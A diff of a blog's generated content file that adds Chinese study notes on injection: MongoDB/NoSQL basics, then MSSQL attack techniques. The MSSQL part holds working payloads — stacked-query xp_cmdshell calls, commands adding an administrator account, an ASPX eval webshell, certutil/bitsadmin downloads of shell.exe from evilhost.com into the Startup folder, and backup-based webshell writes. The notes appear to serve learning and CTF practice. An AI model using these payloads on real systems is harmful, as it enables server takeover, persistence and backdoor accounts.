@@ -8572,6 +8572,7 @@
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206172054640.png" alt="image-20241206172054640"></p>
 <p>目录下的xplatform.txt，然后就可以进行爆破了，然后可以根据response包去判断哪些字符是被过滤了哪些字符能用</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206173227672.png" alt="image-20241206173227672"></p>
+<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>开始nosql了</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
@@ -9504,7 +9505,110 @@
 <li>改。有修改&#x2F;更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li>
 </ul>
 <h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><strong>SQL注入：</strong>是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中<strong>注入sql指令</strong>，在设计不良的程序当中<strong>忽略了字符检查</strong>，那么这些注入进去的恶意指令就会被数据库服务器<strong>误认为是正常的sql指令而运行</strong>，因此遭到破坏或是入侵。这种漏洞可能<strong>导致数据泄露、数据篡改、身份冒充和其他严重的安全问题</strong>。</p>
-<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h2><p>什么是mssql？</p>
+<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h2><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>什么是nosql？</p>
+<p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。他指的不是单单某一种数据库管理系统，而是用于描述一类数据库管理系统，包括键值数据库，列式数据库，文本数据库，图形数据库等。这些系统会使用不同于传统关系型数据库的数据存储模型。NoSQL数据库<strong>提供比传统SQL数据库更宽松的一致性限制</strong>。 通过减少关系约束和一致性检查，<strong>NoSQL数据库提供了更好的性能和扩展性</strong>。 然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，所以潜在影响要大于传统SQL注入。</p>
+<p>而MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p>
+<p>接下来我们就以MongDB为例，去讲解这个nosql注入</p>
+<p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p>
+<h3 id="关于MongDB基础使用"><a href="#关于MongDB基础使用" class="headerlink" title="关于MongDB基础使用"></a>关于MongDB基础使用</h3><table>
+<thead>
+<tr>
+<th>RDBMS</th>
+<th>MongoDB</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据库</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>表格</td>
+<td>集合</td>
+</tr>
+<tr>
+<td>行</td>
+<td>文档</td>
+</tr>
+<tr>
+<td>列</td>
+<td>字段</td>
+</tr>
+<tr>
+<td>表联合</td>
+<td>嵌入文档</td>
+</tr>
+<tr>
+<td>主键</td>
+<td>主键（MongoDB 提供了 key 为 _id）</td>
+</tr>
+</tbody></table>
+<ul>
+<li>数据库(database)</li>
+</ul>
+<p>一个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show dbs显示所有的数据库的列表</span><br><span class="line">db 显示当前数据库对象或集合</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>集合(collection)</li>
+</ul>
+<p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
+<p><code>show collections</code> 或 <code>show tables</code> 命令可以查看已有集合</p>
+<ul>
+<li>文档（Document）</li>
+</ul>
+<p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
+<h3 id="nosql基础语法"><a href="#nosql基础语法" class="headerlink" title="nosql基础语法"></a>nosql基础语法</h3><ul>
+<li>创建数据库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use DATABASE_NAME#如果数据库不存在，则创建数据库，否则切连接并换到指定数据库</span><br></pre></td></tr></table></figure>
+
+<p>举个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; use db1</span><br><span class="line">switched to db db1</span><br><span class="line">&gt; db</span><br><span class="line">db1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建集合</li>
+</ul>
+<p>使用 <code>createCollection()</code> 方法来创建集合</p>
+<p>基础语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.createCollection(name, options)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>name：要创建的集合名称</li>
+<li>options：可选参数，指定有关内存大小及索引的选项</li>
+</ul>
+<p>举个例子，我们在数据库中创建一个集合</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; use db1</span><br><span class="line">switched to db db1</span><br><span class="line">&gt; db.createCollection(&quot;user1&quot;)</span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>插入文档</li>
+</ul>
+<p>使用 <code>insert()</code> 方法向集合中插入文档</p>
+<p>基础语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.insert(document)</span><br></pre></td></tr></table></figure>
+
+<p>举个例子，我们在数据库的集合中插入一个文档</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; db.user1.insert(&#123;name: &#x27;whoami&#x27;, </span><br><span class="line">    description: &#x27;the admin user&#x27;,</span><br><span class="line">    age: 19,</span><br><span class="line">    status: &#x27;A&#x27;,</span><br><span class="line">    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更新文档</li>
+</ul>
+<p>使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档</p>
+<ul>
+<li><strong>update() 方法</strong></li>
+</ul>
+<p>update() 方法用于更新已存在的文档。</p>
+<p>基础语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;update&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     upsert: &lt;boolean&gt;,</span><br><span class="line">     multi: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li>
+<li>update：update 操作的对象和一些更新的操作符（如 <code>$set</code>）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li>
+<li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li>
+</ul>
+<p>那我们用这个方法将age年龄从19更新到20</p>
+<h2 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h2><p>借鉴师傅的文章:<a href="https://y4er.com/posts/mssql-injection-learn/#%E7%AC%A6%E5%8F%B7,https://y4er.com/posts/mssql-getshell/">https://y4er.com/posts/mssql-injection-learn/#%E7%AC%A6%E5%8F%B7,https://y4er.com/posts/mssql-getshell/</a></p>
+<p><a href="https://www.secpulse.com/archives/193819.html">https://www.secpulse.com/archives/193819.html</a></p>
+<p>什么是mssql？</p>
 <p>MSSQL，或称为Microsoft SQL Server，mssql是Microsoft System Structured Query Language 的缩写，是指微软操作系统的数据库语言，是由微软开发的一种数据库关系管理系统（RDBMS）。</p>
 <h3 id="MSSQL基础使用"><a href="#MSSQL基础使用" class="headerlink" title="MSSQL基础使用"></a>MSSQL基础使用</h3><p>讲到mssql数据库，我们首先要了解到里面的自带库</p>
 <p>默认自带库的类型</p>
@@ -9701,6 +9805,8 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>
 
 <p>那么我们怎么利用呢，执行xp_dirtree返回我们传入的参数如果你想把文件名一起返回来，因为没有回显所以可以这样创建一个临时的表插入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">//创建一个临时表tmp，该表包含三列：dir用于存储文件或目录的路径，num和num1用于存储相关的数字信息。</span><br><span class="line">?id=1;insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1</span><br><span class="line">//INSERT INTO语句执行了master..xp_dirtree存储过程，并将其结果插入到之前创建的表tmp中。</span><br><span class="line">//参数1和1分别是用于指示是否要处理子目录以及返回文件和目录的深度的参数。</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>xp_cmdshell</li>
 </ul>
@@ -9713,8 +9819,53 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">/* 查看是否存在 xp_cmdshell，返回 1 则存在 */</span><br><span class="line">SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype=&#x27;x&#x27; AND name=&#x27;xp_cmdshell&#x27;</span><br><span class="line"></span><br><span class="line">/* 开启 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">/* 关闭 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
 
+<p>一般的用法(执行命令)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line">EXEC xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">EXEC xp_cmdshell &#x27;dir c:&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;dir c:&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;ipconfig/all&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal&quot; &quot;ServerWinStationsRDP-Tcp /v PortNumber&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;net user hacker Passw0rd /add&#x27;,NO_OUTPUT</span><br><span class="line">EXEC master..xp_cmdshell &#x27;net localgroup Administrators hacker /add&#x27;,NO_OUTPUT</span><br></pre></td></tr></table></figure>
 
+<p>接下来我们先来看cmd中怎么查找文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Aleen&gt;for /r c:\ %i in (1*.aspx) do @echo %i</span><br><span class="line">/*</span><br><span class="line">这是一个for循环命令，用于在指定目录及其子目录中遍历文件。</span><br><span class="line">%i：这是循环变量，用于存储每个匹配到的文件路径。</span><br><span class="line">(1*.aspx)：这是匹配文件名的模式。1*.aspx表示以1开头且以.aspx结尾的文件。</span><br><span class="line">do关键字后面的命令@echo %i用于打印匹配到的文件路径。</span><br><span class="line">%i表示当前循环的文件路径。</span><br><span class="line">*/</span><br><span class="line">e:\code\php\1.php</span><br><span class="line">C:\Users\Y4er&gt;</span><br></pre></td></tr></table></figure>
 
+<p>所以我只需要建立一个表 存在一个char字段就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;CREATE TABLE cmdtmp (dir varchar(8000));//创建一个名为cmdtmp的表。</span><br><span class="line">?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后通过注入去查询该表就可以了。</p>
+<p>到这里的话我们就了解完了绝对路径的获取方法，那我们接下来该怎么拿shell呢</p>
+<h5 id="1-2-xp-cmdshell拿shell"><a href="#1-2-xp-cmdshell拿shell" class="headerlink" title="1.2 xp_cmdshell拿shell"></a>1.2 xp_cmdshell拿shell</h5><p>上面已经讲到,xp_cmdshell可以用于执行Windows的cmd命令，那我们可以通过cmd 的echo命令来写入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过下载文件去把我们的payload传入</p>
+<p>下载文件通常有下面几种姿势</p>
+<ol>
+<li>certutil</li>
+<li>vbs</li>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>ftp</li>
+</ol>
+<p>这里介绍两种比较常用的</p>
+<p>调用 certutil 下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;cd C:UsersPublic &amp; certutil -urlcache -split -f http://evilhost.com/download/shell.exe&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>调用 bitsadmin 下载文件并写入系统启动项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;bitsadmin /transfer n http://evilhost.com/image/shell.exe C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUpshell.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-3-差异备份拿shell"><a href="#1-3-差异备份拿shell" class="headerlink" title="1.3 差异备份拿shell"></a>1.3 差异备份拿shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line"></span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);</span><br><span class="line"></span><br><span class="line">3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"></span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>
+
+<p>差异备份我们有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到c盘根目录</p>
+<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用前面提到的 定义局部变量来执行。</p>
+<h5 id="1-4-log备份拿shell"><a href="#1-4-log备份拿shell" class="headerlink" title="1.4 log备份拿shell"></a>1.4 log备份拿shell</h5><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. alter database 库名 set RECOVERY FULL </span><br><span class="line"></span><br><span class="line">2. create table cmd (a image) </span><br><span class="line"></span><br><span class="line">3. backup log 库名 to disk = &#x27;c:\xxx&#x27; with init </span><br><span class="line"></span><br><span class="line">4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line"></span><br><span class="line">5. backup log 库名 to disk = &#x27;c:\xxx\2.asp&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>log备份的好处就是备份出来的webshell的文件大小非常的小</p>
+<h4 id="2-提权getsystem"><a href="#2-提权getsystem" class="headerlink" title="2.提权getsystem"></a>2.提权getsystem</h4><p>我们继续来探究该怎么提权的问题</p>
+<p>一般来说我们用xp_cmdshell去执行我们的payload后，通常会利用Cobalt Strike</p>
+<p>Cobalt Strike是一款专业的渗透测试工具，一些Cobalt Strike的主要特点包括：</p>
+<ol>
+<li><strong>木马植入</strong>：Cobalt Strike提供了钓鱼攻击、恶意软件植入等功能，用于在目标系统上植入后门、远程访问工具等。</li>
+<li><strong>漏洞利用模块</strong>：工具包含了各种漏洞利用模块，可用于利用目标系统中的漏洞。</li>
+<li><strong>C2功能</strong>：Cobalt Strike具有C2（命令和控制）功能，允许攻击者与受感染的系统进行通信、控制和数据交换。</li>
+</ol>
+<p>提权没打过，确实写不动了，后面学了再回来补</p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
